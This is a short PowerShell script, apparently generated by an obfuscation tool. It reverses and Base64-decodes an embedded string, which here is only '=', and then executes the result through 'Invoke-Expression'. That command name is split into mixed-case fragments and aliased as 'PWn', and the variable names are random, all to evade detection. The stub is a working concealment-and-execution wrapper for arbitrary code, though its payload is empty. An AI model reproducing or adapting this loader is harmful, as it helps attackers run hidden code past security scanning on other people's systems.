$ayoZIoeIkff4tNtRL = "=" ;
$g4Tpbfq2IMV0NFXDjs = $ayoZIoeIkff4tNtRL.ToCharArray() ; [array]::Reverse($g4Tpbfq2IMV0NFXDjs) ; -join $g4Tpbfq2IMV0NFXDjs 2>&1> $null ;
$bwEHQoVbtGfdNaXaO9EBzC7a = [sYstem.tExT.ENCOdiNg]::UTf8.gEtsTring([SYsTEM.ConvERT]::FRoMBaSE64sTriNg("$g4Tpbfq2IMV0NFXDjs")) ;
Write-Host "Decoded string (rCCMGEWZvfiangSsp4MsppI): $bwEHQoVbtGfdNaXaO9EBzC7a"

$kxm9VdwPyAqn7zt = "inV"+"okE"+"-EX"+"prE"+"SSI"+"oN" ; NeW-aLIaS -NAME PWn -Value $kxm9VdwPyAqn7zt -fOrcE ; PWn $bwEHQoVbtGfdNaXaO9EBzC7a ;
